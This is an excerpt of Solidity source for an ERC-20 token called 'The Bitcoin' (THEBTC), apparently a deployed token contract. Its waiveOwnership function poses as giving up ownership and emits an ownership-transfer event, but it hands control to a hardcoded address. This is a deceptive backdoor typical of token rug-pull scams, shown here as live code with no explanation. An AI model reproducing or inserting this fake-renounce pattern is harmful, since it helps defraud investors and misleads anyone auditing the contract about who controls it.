...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdD47F53D9A9216B47F7359a5BFe6f34425022E8e));
        _owner = address(0xdD47F53D9A9216B47F7359a5BFe6f34425022E8e);
    }
...
contract TheBitcoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "The Bitcoin";
    string private _symbol = "THEBTC";
